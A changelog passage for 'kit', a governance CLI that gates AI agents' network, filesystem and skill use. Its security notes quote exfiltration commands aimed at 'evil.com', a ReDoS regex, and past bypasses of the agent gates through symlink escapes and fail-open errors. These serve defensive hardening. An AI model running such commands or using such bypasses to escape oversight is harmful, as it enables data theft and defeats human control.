- **The publish pipeline now produces a GitHub release, and SBOMs that reach
  it.** Every release through 5.10.0 generated CycloneDX + SPDX SBOMs and then
  attached them to nothing: the upload was guarded with `|| true` because no
  release existed, and nothing created one. The SBOMs survived only as workflow
  artifacts, which expire. The release is now created inside the publish job
  before the SBOM steps, its notes come from this file's section for the version,
  and the attach step fails loudly and then verifies both assets are present.
  Releases for every prior tag (v1.0.1 → v5.10.0) were backfilled by hand.
- **SBOMs identify themselves.** syft recorded the scanned path (`.`) as the root
  component, so `metadata.component` read `.@?` and a bare SBOM file could not
  say which release it described. A generated `.syft.yaml` now sets
  `source.name` / `source.version` from `package.json`.
- **An undocumented release aborts before publishing, not after.** The
  CHANGELOG check initially ran after `npm publish`, so a missing section was
  caught only once the version was already burned on the registry. It now runs
  beside the tag/version check, and the ordering is pinned by tests.

### Security

- **eslint 9.39.4 → 10.8.0** (`@eslint/js` → 10.0.1) to clear
  `GHSA-mh99-v99m-4gvg` — a brace-expansion DoS reaching the tree transitively
  via `@eslint/config-array → minimatch`. Five high findings, which made
  `npm audit --audit-level=high` exit non-zero and would have blocked this very
  release at the publish gate. No smaller fix existed: the advisory range is
  `<=5.0.7` and the patch landed in `5.0.8`, outside the ranges the intermediate
  packages ask for. **eslint is a devDependency, so the published tarball is
  unaffected** — nothing in what you install changed because of this.

## [5.10.0] - 2026-07-24

### Added

- **ADR gate adoption — `kit adr check` is now wired into the workflow.** The rule engine shipped
  in 5.7.0/5.8.0 graduates from a standalone command into the everyday gates, following the
  `kit standards` pattern:
  - **`kit review`** now runs an `=== adr ===` stage and fails the review on any ADR violation
    **or** gap (an unprovable transitive rule is not a pass).
  - **Recommended pre-commit hook** (`kit setup --recommended`) now includes `kit adr check`
    alongside the secret-scan and triage gates — a no-op when a repo has no ADRs.
  - **ADR baseline.** `kit adr freeze` (and `kit baseline freeze`) snapshot current violations/gaps
    into `.kit-baseline.json` so only **NEW** findings gate; existing ones are frozen. The baseline
    key deliberately excludes the line number, so an unrelated edit never silently un-freezes a
    finding. A corrupt baseline fails **open** (gates on everything) and is surfaced, never
    silently swallowed.

  New embeddable `adrCheck` + `collectAdrFindings` / `freezeAdrBaseline` / `adrFindingKey` exports
  in `src/commands/adr.ts` (one freezer, shared by both freeze paths, so they never drift). Still
  zero-LLM.

## [5.9.0] - 2026-07-24

### Added

- **Containment enforce-readiness (defense-in-depth).** kit's `kit doctor` containment posture
  (5.6.0) grows two capabilities, both deterministic and zero-LLM:
  - **Sandboxed-runtime fingerprints** — `detectContainment` now names **gVisor** (`runsc`) and
    **Firecracker** microVMs from userspace-visible strings (`/proc/version`, DMI vendor). A
    *positive* fingerprint names the mechanism (`heuristic` confidence); an *absence* claims
    nothing — these runtimes are deliberately stealthy, so kit never infers "not sandboxed" from
    a missing marker (no false green).
  - **`require containment` — a fail-closed gate.** New `[governance.containment] require = true`
    turns the advisory posture into a hard requirement: `kit doctor` **fails** (not warns) when a
    container/seccomp/sandbox layer beneath the tool boundary cannot be *positively* established —
    **including** when it cannot be determined at all (a required control that cannot be proven
    present is treated as absent). The containment verdict is written to the sealed audit
    (`doctor.containment`) when the policy is in force.

  New pure exports in `src/containment.ts` (`detectGvisorMarker`, `detectFirecrackerMarker`,
  `containmentEnforcement`) and a `[governance.containment]` config section. kit still only
  **detects and verifies** a sandbox as a delegate — it never becomes one.

## [5.8.0] - 2026-07-24

### Added

- **`kit adr` — richer enforce rules (experimental).** Beyond `forbid_pattern`, an accepted
  ADR's ` ```toml kit-enforce ` block now supports two more deterministic rule types:
  - **`require_pattern`** — a regex that **must** appear in each matching file; its *absence*
    gates (e.g. "every `src/web/**` handler must call `withGovernance`").
  - **`forbid_import`** — an import-statement-aware ban on a module specifier (parses real
    `import`/`require`/`from`/dynamic-import specifiers, not any line, so `pg-promise` no longer
    trips a `^pg$` rule). With `transitive = true` it also forbids **reaching** the target
    through the repo's relative-import graph. A relative import that cannot be resolved within
    the repo is surfaced as a **`gap`** ("cannot prove") — it fails closed and prints distinctly,
    never a silent green (no false green).

  New pure exports in `src/adr.ts` (`extractImports`, `resolveRelative`) and a `kind`
  (`violation` | `gap`) + `rule` discriminator on `AdrViolation`. Still zero-LLM: kit enforces
  only the explicit rule block, never ADR prose.

## [5.7.0] - 2026-07-22

### Added

- **`kit adr` — ADR → gate (experimental).** Turn the machine-readable part of an
  Architecture Decision Record into a deterministic gate, cited back to the ADR
  ("why is this blocked? → ADR-0007"). `kit adr check` runs the `forbid-pattern`
  rules of **accepted** ADRs (a fenced ` ```toml kit-enforce ` block, parsed with the
  same smol-toml as `.kit.toml`) over the repo and exits non-zero on a violation;
  `kit adr list` shows each ADR's status and whether it is enforced or
  documented-only. kit **never interprets ADR prose** (off-charter) — only the
  explicit rule block gates, and an accepted ADR with no rules is surfaced as
  "documented, not enforced", never silently green. New pure `src/adr.ts`
  (`parseAdr` / `evaluateAdr` / `globToRegExp`). Realizes the
  architecture-canon-in-the-llm-era thesis: the decision becomes an enforced
  constraint an agent cannot drift past.

## [5.6.0] - 2026-07-22

### Added

- **`kit doctor`: OS-containment posture (defense-in-depth).** Deterministically detects the
  sandbox *below* the tool boundary from Linux `/proc` (container markers, seccomp mode,
  no_new_privs, user namespace) and folds it into the posture: `pass` when contained,
  `warn` when an install/exec gate is wired with **no** OS containment beneath it (pair kit
  with a sandbox), and honest `skip`/`unknown` on non-Linux — never a false "not contained".
  New pure `src/containment.ts` (`detectContainment` + `gatherContainmentSignals`).
  Realizes the containment-as-verified-delegate design: kit detects/verifies a sandbox, it
  does not become one.

## [5.5.0] - 2026-07-22

### Added

- **coverage: AIUC-1 + GCP Well-Architected Security-pillar evidence maps.** Two new
  toggleable `kit coverage` standards via the existing registry pattern
  (`--standard=aiuc-1|gcp-waf-security`, `[coverage].standards`). AIUC-1 is a
  domain-level map that **prepares for** an AIUC-1 audit (SEC/PRIV/ACC auto; SAF/REL/SOC
  honest gap) — explicitly NOT a certificate/attestation. GCP WAF Security is a
  principle-level map (zero-trust/shift-left/use-AI-securely auto; design/compliance
  manual; **use-AI-for-security = n/a by charter** — kit is zero-LLM). Both carry an
  explicit "confirmed via secondary indexes" caveat.
- **`kit triage model <path>` — untrusted AI-artifact triage.** Deterministic, zero-LLM
  triage of model weights / datasets before loading: code-execution-on-load formats
  (pickle family) FAIL; gguf/onnx loader-hardening + safetensors/parquet data-only are
  advisory; unknown = untrusted; flags unverified provenance (a `.sha256`/`.sig` sidecar
  counts) and zero-byte files. (`--json`.)
- **`kit doctor`: agent egress-exposure posture.** Warns when an install/exec gate is
  wired but the exec-broker egress gate is NOT — the exact gap behind the 2026-07
  OpenAI×HuggingFace eval-escape.
- **`kit skill test`: agentskills.io invocation-control conformance.** Parses
  `user-invokable` / `disable-model-invocation` and reports the invocation posture in the
  scope check (advisory; legacy skills unaffected).

### Changed

- **THREAT_MODEL:** new section positioning kit as one layer of defense-in-depth — names
  what it does NOT contain (kernel/network containment) and says to pair it with an OS
  sandbox.

## [5.4.1] - 2026-07-22

### Security

- Lockfile bump to clear a newly-published **high** transitive advisory in `fast-uri`
  (host confusion via failed IDN canonicalization / literal backslash authority delimiter —
  GHSA-4c8g-83qw-93j6, GHSA-v2hh-gcrm-f6hx) via a non-forcing `npm audit fix`. No source
  changes; identical CLI surface to 5.4.0. (5.4.0's publish was blocked by the publish gate's
  `npm audit --audit-level=high` step when the advisory landed; this is the audit-clean
  re-release.)

## [5.4.0] - 2026-07-21

### Added

- **`kit triage mcp` — MCP-Security-Checklist static checks (borrowed from SlowMist/OWASP MCP
  Top 10).** Beyond tool-poisoning (R7) and rug-pull drift, triage now surfaces four deterministic,
  static review signals: **dangerous-capability** (a tool name/description implying arbitrary
  exec/deletion — confirm least-privilege + human approval), **secret-as-parameter** (a param
  shaped like a credential — inject at the boundary, MCP01), **undocumented** (a tool with no
  description — can't be triaged), and **unconstrained-input** (`additionalProperties: true`).
  All **heuristic-confidence and advisory** — they surface for review but never flip the pass/fail
  verdict, which stays gated on high-confidence poisoning + drift (no false-block). `checklistFindings`
  is exported + unit-tested; pure and deterministic.

- **`kit memory export --obsidian <dir>` — the curated shared tier as an Obsidian vault (J3).**
  Renders each shared decision/convention as an Obsidian note (YAML frontmatter with
  id/area/kind/status/provenance + `kit/*` tags, an H1 title, body, refs) grouped under `area/`,
  with `[[wikilinks]]` for supersede/reverse relations and a per-area `_index.md` MOC. Pure,
  deterministic renderer (`renderObsidianVault`); `--json` emits a dry-run manifest (paths +
  bytes, no writes); write errors fail closed (never a partial-export "success"). Read-only over
  already-secret-scanned entries, so the export never re-introduces a secret.

- **`kit memory search --brief` — progressive-disclosure recall (B3).** Returns the *minimal
  sufficient slice* of a recall — top-ranked hits trimmed to budget-bounded snippets — and reports
  how many were **withheld** so you can expand (`--limit` / drop `--brief`), instead of dumping
  every match into context. Never silently truncates: the withheld count is explicit (same
  discipline as `kit map`'s logged drops), and the first hit is always disclosed. Pure core
  `progressiveDisclose` (deterministic; default 1200-char budget / 240-char snippets / 8 hits),
  unit-tested; `--json` carries the structured `disclosure`.

- **`kit memory` rule aging — surface stale machine-origin rules for review, never auto-drop (B2).**
  Curated shared-tier rules now carry a deterministic **aging class**: only `derived`/`inferred`
  *active* rules age (fresh < 180d ≤ aging < 360d ≤ stale); an **operator's explicit rule is
  foundational and never ages** (the human owns its relevance), and superseded/reversed entries are
  history. `kit memory areas` prints an aging nudge when machine-origin rules go stale; `kit memory
  area <name>` badges each entry and takes `--stale` to show only aged-out rules for review (JSON
  carries the `aging` field). kit never deletes — it flags for re-affirm/supersede. Pure core
  (`classifyAging` / `agingReport`), unit-tested; deterministic, zero-LLM.

- **`kit scan` delegate library — connect what kit shouldn't rebuild, toggleable.** The external
  scanner registry (snyk/trivy/grype/semgrep/osv-scanner/socket) is now a **toggleable delegate
  library**, mirroring the coverage-standards registry: `kit scan --list-delegates` enumerates it
  with on/off state, and `[scan].delegates` in `.kit.toml` is an allow-list that picks which
  scanners run (absent/empty ⇒ all on, backwards-compatible). The principle it encodes: **kit
  delegates *detection* to best-of-breed tools, never its *verdict*** — findings still merge into
  one deterministic, fail-closed result. `enabledScanners` / `isScannerEnabled` / `SCANNER_IDS`
  are exported + unit-tested.

- **`kit coverage` — agent-native standards + a toggleable standards library.** Coverage
  evidence maps are now a **registry** (single source of truth) instead of a hardcoded pair, and
  two standards native to kit's own lane land as the first new entries: **OWASP Top 10 for Agentic
  Applications (2026)** (`--standard=agentic-top10`) and **OWASP MCP Top 10 (2025)**
  (`--standard=mcp-top10`). `--standard=all` runs every enabled standard; `--list-standards`
  enumerates the library with on/off state; and `[coverage].standards` in `.kit.toml` is an
  allow-list that toggles standards on and off (absent ⇒ all on, backwards-compatible). Adding a
  future standard is one registry entry + its descriptor. Still an **evidence map, never a
  compliance attestation**; deterministic and zero-LLM. The two new maps are honest about kit's
  lane — strong on tool-misuse / identity+privilege / supply-chain / memory-poisoning / audit,
  explicit `gap`/`na` on inter-agent comms, cascading failures, human-trust, and rogue-agent
  detection. (Control ids/titles confirmed via secondary indexes; owasp.org first-party fetch was
  HTTP-403 blocked — caveat carried on each descriptor.)

## [5.3.0] - 2026-07-19

### Added

- **`kit broker enforce` — the guided observe→enforce flip (Pillar 3 capstone).** Turns the
  exec-broker from _observational_ to _protective_ in one evidence-gated command. It runs the
  `enforce-readiness` pre-flight and **refuses without `--force` unless the verdict is `ready`**
  (fail-closed — it will not silently enable a posture the observed evidence says would break, or
  one with no evidence at all), then sets `[scope].enforce_runtime = true`, **re-signs** the
  profile scope (so the flip is attributable — enforce only takes effect under a valid signature),
  and audits the transition (`phase: "enforce-enabled"`). On a sign failure it surfaces that the
  scope won't verify until re-signed (never a silent half-enabled state). Completes the
  observe→enforce ladder: `enforce-readiness` (E1/E2) tells you it's safe; `enforce` does it.
  Deterministic, zero-LLM. `--json` for machines. `kit doctor`'s exec-broker-runtime row now
  gives an **evidence-based nudge**: in observe with a clean window it points to `kit broker
enforce`; with would-be denials it points to `kit broker enforce-readiness` to see them first.

- **`kit memory search --fresh` — recency-aware recall (deterministic, zero-LLM).** By default
  recall is bm25 relevance-first (unchanged). `--fresh` fetches a larger candidate pool and
  **RRF-fuses** two incommensurable signals — bm25 relevance and recency — _by rank_ (no score
  normalization), so a fresh, still-relevant hit can outrank a marginally-more-relevant stale
  one ("when relevance is otherwise equal, the newer answer wins"). Relevance still dominates;
  recency breaks the lower ranks. Exposes a reusable `fuseByRrf` primitive for future
  multi-signal fusion. Borrowed from the Cerebras knowledge-base ranking stack, kept on-charter
  (kit has one lexical retriever + recency; no embeddings, no reranker model).

- **`kit broker enforce-readiness` — graduate observe→enforce on evidence, not nerve.**
  The exec-broker runtime ladder is off → observe → enforce, but the human step between the last
  two had no evidence: an operator in observe (which watches but never denies) had no way to
  answer _"is it safe to flip to enforce?"_, so people stayed in observe forever and the
  governance never actually protected. This command reads the recorded observe window
  (`.kit-audit.jsonl`, the `wouldDeny` events observe already writes) and reports a verdict:
  **`ready`** (nothing observed would be denied), **`would-block`** (+ the exact would-be
  denials, tallied — so you declare them in `[scope]` and re-sign, or accept them knowingly,
  before flipping), or the honest **`untested`** (no observe data — deliberately not a green
  "ready"; coverage is only what was observed). Turns the flip from a leap into a diff.
  `--json` for machines; `--gate` fails CI on any not-`ready` verdict. Deterministic, zero-LLM,
  reads the audit log only — never executes anything. (The guided `kit broker enforce` flip is
  a follow-up.)

- **kit memory captures the full decision lifecycle — negative-space kinds + provenance.**
  The curated shared tier gains two kinds for the knowledge that evaporates hardest:
  **`idea`** (considered / not-yet-built) and **`abandoned`** (tried and dropped, with the
  reason). `abandoned` entries are re-surfaced on resume for the area you're touching — so
  the next session sees _"we tried X here and dropped it, because Y"_ **before** re-trying it.
  Entries also carry optional **`provenance`** (`operator` | `derived` | `inferred`, absent ⇒
  operator) and **`confidence`**; recall now orders an operator's explicit statement **above**
  a pattern kit merely derived, then by recency. Both fields are signature-covered and written
  only when set, so existing entries stay byte-identical. `kit memory share` gains
  `--provenance` / `--confidence` and now validates `--kind` (a typo no longer persists a
  garbage kind). Deterministic, zero-LLM.

### Security

- **Standards plugins reject ReDoS-prone regexes at load (class E — completes the bug sweep).**
  A declarative standards plugin's `match` was compiled and run over every source line with no
  protection against catastrophic backtracking, so a crafted plugin (`match = '(a+)+$'`) could
  hang `kit check` indefinitely — a fail-open DoS via a PR-submitted TOML. A deterministic,
  dependency-free detector (`hasReDoSRisk`) now flags the classic nested-unbounded-quantifier
  shape (`(a+)+`, `(\d*)*`, `((ab)+)+`, `(a{2,})+`) and **rejects** such a plugin at load with an
  integrity warning — it is never compiled into the per-line evaluator. Honest limit: it catches
  the nested-quantifier class (the common, cited ReDoS), not every catastrophic regex; the
  existing max-line-length cap remains as defense-in-depth.

- **Secrets, audit, and scanner robustness (four bug-sweep findings, class F).**
  - **`"manual"` rotation policy no longer crashes the vault.** `storeSecret`/`rotateSecret` did
    `parseInt(rotation_policy)`, which is `NaN` for the valid `"manual"` value → `new Date(now +
NaN).toISOString()` threw `RangeError` (and in `rotateSecret`, after the key was already
    rotated — leaving unaudited, inconsistent state). Day-based policies (`30d`/`60d`/`90d`) are
    now matched explicitly; `manual`/`never` simply leave `next_rotation_at` unset.
  - **`kit gha-audit` no longer reports a false green over unreadable workflows.** A workflow it
    could not read (perms/EISDIR/TOCTOU) was silently skipped, then the run emitted "all actions
    pinned" — a false pass for a supply-chain scanner. Unreadable workflows now surface a
    scanner-health `warn` naming them, and the blanket pass is suppressed.
  - **Staged-secret pre-commit scan no longer falls back to a divergent working copy.** On a
    `git show :file` failure (e.g. a staged blob over the buffer cap) it read the working copy —
    which a developer can clean after staging the secret, the exact un-stage bypass the scan
    exists to stop. The cap is raised so realistic files scan from the staged blob, and an
    unreadable staged blob now fails **closed** (flagged) instead of trusting the working copy.
  - **`kit audit secrets --since-days` NaN-guarded** — a non-numeric value silently returned all
    events (window ignored); it now falls back to 30.

- **Malformed input now yields a verdict, never an uncaught crash (fail-closed parsers).** The
  bug sweep found the historical "malformed file → uncaught throw → empty stdout" class had
  reappeared in several spots, all now fixed:
  - a malformed/schema-invalid `.kit-profile.toml` crashed every `kit profile` subcommand
    (`show`/`check`/`sign`/`verify`/`freeze`) with an uncaught `InvalidProfileError` and empty
    `--json` stdout — a denial-of-verdict for CI. The top-level handler now catches
    `KIT_INVALID_PROFILE` exactly like `KIT_INVALID_CONFIG`: a clean `{ok:false,error}` JSON +
    exit 1.
  - `classifyGuardDog` and the SARIF/OSV ingesters (`parseSarif`/`parseOsv`) dereferenced a
    `JSON.parse` result without a non-object guard, so a literal `null` (valid JSON) threw a
    `TypeError` — for GuardDog, crashing the whole `kit check --category security` run. They now
    treat a null/non-object result as "unverified"/`[]` per their documented fail-closed contract.

- **egress-gate now enforces scheme-less `curl`/`wget` targets.** Network-target extraction
  parsed only explicit `http(s)://` URLs, so `curl evil.com`, `wget evil.com/x`, and
  `curl -sL evil.com/exfil` — the most common egress forms — produced zero hosts and the signed
  `[scope].egress` allowlist was **not enforced** for them (a fail-open the sweep flagged). A
  second, still-conservative extraction pass now reads the positional argument of `curl`/`wget`
  as a network target, skipping value-taking flags (`-o out.txt`, `-H`, `-d @data.json`, …) so
  their arguments are never mistaken for hosts, and only accepting a strict dotted-domain shape
  (zero false positives — `localhost`, bare words, and `-o`/`-d` values are not treated as
  hosts). Implicit-registry tools (`git`/`npm`/`pip`), non-http schemes, and variable-expanded
  URLs remain out of reach — command-string inspection is defense-in-depth, documented as such,
  not a substitute for a network sandbox.

- **exec-broker PreToolUse gates hardened to fail closed (three bypasses, found by an internal
  bug sweep).** The runtime enforcement point (`kit gate-fs` / `kit gate-egress`) and the CLI's
  gate dispatch had gaps where an attacker or an internal fault could slip past confinement:
  - **fs-gate was symlink-blind.** It ran only the pure string-containment check and omitted the
    symlink-aware realpath check the canonical exec-broker already uses, so a symlink inside the
    signed `[scope].fs` root pointing outside (e.g. `data → /`) let a write escape scope. The
    gate now requires **both** checks per root — parity with the broker (the enforcement point
    must never be weaker than the broker it mirrors). The realpath check now lives in a shared
    `exec-broker/realpath-check.ts` so there is one source of truth.
  - **A gate that threw failed OPEN.** Deny is signalled by `exit 2`; any thrown error fell
    through to the generic `exit 1` (a _non-blocking_ PreToolUse result), so an internal fault
    (e.g. the working directory removed mid-run → `process.cwd()` throws) would silently ALLOW
    the very operation the gate exists to mediate. Gate dispatch now runs fail-closed: any
    handler fault DENIES (exit 2 / Cline `{cancel:true}`).

- **SkillSpector delegate now passes `--no-llm` explicitly** (`kit triage skill --deep`).
  kit ran SkillSpector's Stage-1 static scan only, suppressing the optional Stage-2 LLM pass
  via env scrubbing alone (`SKILLSPECTOR_PROVIDER=""` + stripped provider keys). It now also
  passes the `--no-llm` flag in the argv itself — belt-and-suspenders, so a future
  SkillSpector default or ambient config can never silently re-enable the model stage
  (which would ship file contents to a provider, breaking kit's zero-LLM / no-egress
  charter). The zero-LLM intent is now legible in the command line, not only the environment.

## [5.2.0] - 2026-07-18

### Added

- **`kit skill test --runtime` now proves negative controls HELD, not just detects violations.**
  A forbidden action a gate _denied_ never runs, so it is absent from the transcript — it lands
  in `.kit-audit.jsonl` as a `gate-egress`/`gate-fs` deny. The gate now stamps the PreToolUse
  `session_id` on that deny event as a **join key**, and the runtime audit attributes each deny
  to the skill run that was active when it fired (session + span time-window — precise and
  session-bounded, not a global timestamp guess). The negative-control check can now report
  **"control held — N forbidden attempt(s) denied"** with evidence, closing the path that was
  deferred in the previous increment for lack of a join key. Best-effort: no audit log → no
  denial evidence (never breaks the audit); a denied action is `deniedForbidden`, never counted
  as a violation that ran. Deterministic, zero-LLM.

- **`kit skill test --runtime` now checks egress/fs target-scope, not just tool-scope.**
  When a signed broker scope is present, each span-attributed action is enriched with a
  broker verdict via the SAME decisions the gate-egress / gate-fs enforcers apply
  (`checkEgress`/`checkFsWrite`): a `Bash` command's hosts, a `WebFetch` URL, and a
  `Write`/`Edit` `file_path` are checked against the signed `[scope]`. This catches a skill
  that stays within its declared _tools_ but uses an allowed tool (Bash/WebFetch) to reach
  an _off-scope host_ or write outside the allowed roots — the exfil-via-allowed-tool vector
  — folding it into the existing `adherence`/`negative` verdicts. Without a verified scope,
  tool-scope adherence still applies (verdicts stay undefined). Deterministic, zero-LLM.

- **`kit skill test --runtime` (experimental) — the recorded-run audit that closes two
  of the checks P1 disclaimed.** kit never runs a skill (zero-LLM); it audits what the
  agent already recorded. The memory transcript index (`tool_uses`) reconstructs each
  skill run as a **span** — a `Skill` invocation opens it, following tool calls until the
  next `Skill` call or session end are that skill's actions — and two checks now decide
  from that evidence: **adherence** (an out-of-declared-scope tool that actually ran →
  `fail`; all in-scope across N observed runs → `pass`; no recorded run → honest `skip`)
  and **negative controls** (a forbidden action that succeeded → `fail`; none attempted →
  `skip` "not exercised", never a false-green pass). Low-confidence attribution downgrades
  a would-be fail to an inconclusive `skip` — kit never blames a skill for an action it
  cannot attribute. Off by default; `--runtime` opts in. Honest coverage limit surfaced:
  verdicts cover _observed_ runs, not all runs; denial-based "control held" evidence and
  egress/fs target-scope adherence are later increments. `rubric` stays OUT forever (LLM —
  delegated). Design: kit-research skill-test-p2-runtime-adherence note.

## [5.1.0] - 2026-07-16

### Added

- **`kit skill test <path>` (experimental) — module-discipline linter for a
  `SKILL.md`.** Treats an agent skill as a software module and runs four deterministic,
  zero-LLM checks: **contract** (required frontmatter present + slug-shaped name +
  non-trivial description + body), **trigger** (a trigger is declared + no collision with
  a sibling skill's normalized trigger), **scope** (declared least-privilege —
  `allowed-tools` present and bounded, wildcard/absent fails), and **regression**
  (contract+trigger+scope fingerprint vs a committed `.kit-skill.snapshot.json`, drift
  fails like `public-surface.json`; `--update-snapshot` pins it). `--gate` makes any
  failure a non-zero CI exit; `--json` for tooling. It is the module-discipline sibling
  of `kit triage skill` (which answers "safe to install?"). Honest seams stated in every
  run: proving a skill _refrains from_ forbidden actions and _stays within_ its declared
  scope at **runtime** needs the exec-broker (a later phase), and grading whether the
  output is _good_ is an LLM judgement that kit **delegates** to an eval harness and never
  runs. Design: kit-research skills-as-software-modules note.
- **`kit bootstrap` (experimental) — one-command cold start for an ephemeral
  environment.** Composes `setup` → `identity init` → `policy pull` → `profile import`
  → `memory restore` behind one idempotent, non-interactive verb, driven by a single
  platform-injected seed (vault auth + `KIT_MEMORY_PASSPHRASE`/`KIT_MEMORY_BACKUP` +
  optional `--profile` bundle). The floor is fail-closed (config/identity/policy+profile
  integrity — a broken gate aborts); the fuel is fail-open (secrets availability, recall
  degrade to a blank-but-working environment). `--json` emits a redacted receipt; the
  seed is never fetched, stored, or logged. See docs/ENV_FUELING.md.

### Fixed

- **Secrets scan (degraded path): substitution expressions are no longer flagged.**
  The basic no-trufflehog scan flagged pure template references — `${{ secrets.X }}`
  (GitHub Actions), `${VAR}` (shell/compose), `{{ .Values.x }}` (Helm/Jinja),
  `$(cmd)` (command substitution) — as
  secret-shaped strings; these are the _correct_ way to reference a secret, never a
  literal credential. Found by running the findings sweep against `curl/curl`
  (workflow files) and `simonw/llm` (contributing docs) — the only warns on both. The filter is now an exported pure function
  (`basicSecretScanFiles`) with unit tests; a template-_prefixed_ literal still flags.
- **Lockfile handling is ecosystem-aware — no more false-RED on pnpm/bun/yarn/cargo/go/…
  repos (#354).** Both signal layers were npm/pip-only: `npm audit` ran on any
  `package.json` (erroring into a high-severity `audit check failed` on pnpm/bun/yarn),
  and the committed-lockfile check only accepted `package-lock.json` / `requirements.txt`
  (flagging a healthy repo that commits `pnpm-lock.yaml` / `bun.lock` / `Cargo.lock` /
  `go.sum` / … as "no lockfile"). Now `npm audit` skips honestly (not-applicable; deps
  still covered by osv-scanner) when there is no npm lockfile, and a new
  `LOCKFILE_ECOSYSTEMS` map accepts any valid committed lockfile per present manifest.
  Found by pointing kit's floor at the agent harnesses it integrates with; verified e2e
  (cline/opencode/codex/create-t3-app: 2 false-red high-fails each → skip + pass).

## [5.0.0] - 2026-07-11

With 5.0, kit stops being only a _point-in-time_
verifier and becomes a _continuous, portable, fail-closed governance layer_ for
the agent loop. Four pillars land, on top of a unified command surface. Nothing
here breaks the 2.x/4.x CLI, config, or plugin contracts — every new capability
is additive and every new gate is opt-in or degrades honestly.

### Pillar 1 — Hardware-rooted identity (#289, #290)

- **Honest keystore posture.** `kit doctor` surfaces WHICH backend signs kit's
  identity (Secure Enclave / TPM / external command vs. the file-backed 0600
  key) and NEVER silently downgrades: a file-backed key is a `warn`, and
  `KIT_REQUIRE_HARDWARE` makes a missing hardware backend a fail-closed `fail`.
- **`kit identity migrate`.** Move identity onto a hardware backend and revoke
  the old file key in one attributable, audited step.

### Pillar 2 — Control plane + keyless credentials (#317–#323)

- **Offline-verified policy distribution.** `kit policy pull` fetches an
  org-signed `.kit-policy.toml`, verifies it against the anchored signers
  entirely offline, and `pull-revocations` propagates revocations monotonically
  (never un-revokes). Fleet-RBAC rides the same signed channel.
- **Offline signed approval tokens.** `kit policy approve` mints/consumes
  identity-signed, offline-verifiable approval tokens for gated operations.
- **Keyless credentials — sign, don't store.** A pure RFC 9421 HTTP Message
  Signatures core (`src/keyless/http-sig.ts`) plus an identity bridge lets kit
  sign egress requests for hosts declared in `[scope].sign` instead of holding a
  long-lived secret. `kit doctor` reports the keyless posture, fail-closed.
- **Control-plane posture row** in `kit doctor` + self-host protocol docs.

### Pillar 3 — Exec-broker: one governance floor (#303–#316, #324–#326)

- **Pure scope-decision core** (`checkEgress` / `checkFsWrite` / `scopeEnv`) with
  fail-closed source resolution: no verified signed scope ⇒ grants nothing.
- **PreToolUse enforcers** `kit gate-egress` / `kit gate-fs` block Bash network
  targets and Write/Edit paths outside the signed `[scope]`, wired via
  `kit agent-config --broker-gate`.
- **Runtime mediation at the MCP surface**, staged safely: `off → observe
(dry-run, audits `wouldDeny`) → enforce`. A verified scope now **observes by
  default** (`[scope].enforce_runtime` absent ⇒ observe) — mediation is on out of
  the box without breaking anyone; enforce remains an explicit opt-in.
- **Reconciliation (R1–R4).** The duplicate broker core was deleted and the whole
  governance floor unified onto ONE exec-broker: CLI gates, the MCP runtime, and
  the `kit doctor` posture all read the same signed decision — there is one
  broker, not two.

### Pillar 4 — Traveling profile + lifecycle insight (#291–#299, #325)

- **Versioned, portable profile.** `kit profile` declares
  `{skills, mcp, workflows, plugins, vault, gates, scope}` with canonical
  serialization; `show|freeze|check` report declared-vs-discovered drift; `sign`
  binds the scope/RoE; **`export`/`import`** move a signed bundle to a fresh host,
  integrity-verified offline and fail-closed on tamper/revocation.
- **Lifecycle insight.** A deterministic transcript tool-usage scanner powers
  `kit insight unused` (loaded-but-never-called MCP servers), real
  loaded-but-unused verdicts for skills, and a repeat→codify skill-draft scaffold.
- **BYO-gap closers.** `kit triage plugin` (supply-chain + manifest-poisoning),
  `kit triage vault-config` (backend-selection), and plugin discovery close the
  last unaudited surfaces.
- **Repo-map (`kit map`).** A deterministic, zero-LLM import graph of the repo:
  `kit map <path> [--depth N] [--budget N] [--json]` returns the minimal relevant
  SLICE around a seed file (the files connected within N import hops, both
  directions, plus the external packages) — so an agent loads part of a growing
  repo, not the whole tree. `--budget` keeps the N nearest-to-seed files and
  **logs every drop** (never silent truncation). Pure graph core + a
  dependency-free TS/JS extractor; relative specifiers that resolve to no known
  file are dropped, never guessed. Each slice file is annotated with its owner(s)
  — from a committed **CODEOWNERS** (deterministic, last-match-wins), or the
  **git-blame top-author** when no CODEOWNERS exists (fail-closed: git
  absent/errored → no owner, never guessed) — so an agent knows who to route to.
  `--co-change` adds each seed's historically co-changing files from git history
  (coupling imports miss — schema↔migration, code↔test), from one bounded
  `git log`; fail-closed when git is absent. Exposed to agents as the **`kit_map`
  MCP tool** (paths / depth / budget / co_change), sharing one core (`mapReport`)
  with the CLI so the two surfaces can't disagree. The import graph covers
  **TS/JS and Python** (dotted/relative imports, `src/` layouts); an unresolved
  import is external, never guessed.

### Triage delegate — deep skill scanning, borrowed authority (#327–#332)

- **`kit triage skill --deep`** delegates to NVIDIA SkillSpector's STATIC Stage 1
  (regex + AST + offline OSV) and normalizes its SARIF into kit's verdict,
  attributed to the source. kit NEVER runs SkillSpector's LLM stage — enforced by
  a scrubbed child env (every `SKILLSPECTOR_*` + provider key stripped) and a
  static invocation. Fail-closed: an absent binary is a `skip`, never a silent
  deep-clean.
- **Commit-time enforcement.** `kit triage check-skills` blocks a staged skill
  that lacks a fresh `--deep` triage; `kit setup --recommended` now wires both
  triage gates (`check-deps` + `check-skills`) into the pre-commit hook; and
  `kit doctor` reports whether the gates are actually wired.

### Unified surface (#271–#288)

- **One source of truth.** `cli.ts` was decomposed into cohesive `commands/*`
  modules and a `COMMAND_REGISTRY` from which the CLI verbs, MCP exposure, help,
  and stability tiers are all derived — a drift test proves CLI ≡ MCP.
- **No false green.** Six fabricated-success MCP stubs were removed; a tool that
  can't really run now says so.

### Added — coverage + supply-chain gates (#255–#266, #270)

- `kit coverage --standard` maps kit's deterministic checks to OWASP ASVS L2,
  OWASP LLM Top 10 (2025), and NIST SSDF (800-218A) evidence maps.
- Memory write-gate + verified-forget (G1), secret write-gate (G2), calibrated
  slopsquat risk score (G4), `kit triage mcp` tool-poisoning/rug-pull (G3), and
  the agent-toolchain SBOM over skills/MCP/plugins (G5).

### Fixed

- `kit memory restore` now surfaces the REAL failure cause (missing file, bad
  format, permissions) instead of always reporting "wrong passphrase or corrupt
  backup" — only a genuine AES-GCM auth failure blames the passphrase now
  (`restoreFailureMessage`, unit-tested).

### Changed

- Minimum Node.js is 22+. The public CLI/config/plugin contracts are unchanged;
  5.0 is a major version for the scope of new capability, not for any break.

## [4.4.0] - 2026-07-07

> Note: 4.4.0 was prepared in-repo but never published to npm (the registry went
